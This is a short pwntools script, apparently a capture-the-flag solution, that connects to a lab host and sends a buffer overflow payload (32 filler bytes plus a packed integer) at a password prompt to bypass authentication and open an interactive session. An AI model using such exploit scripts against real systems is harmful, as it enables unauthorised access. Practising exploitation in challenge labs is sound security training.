from pwn import *

context.binary = elf = ELF("./chall")
context.log_level = "info"

HOST = "192.168.64.203"
PORT = 5001

io = remote("192.168.64.203", 5001)
payload = b"A" * 32 + p32(1)

io.sendlineafter(b"Password: ", payload)
io.interactive()

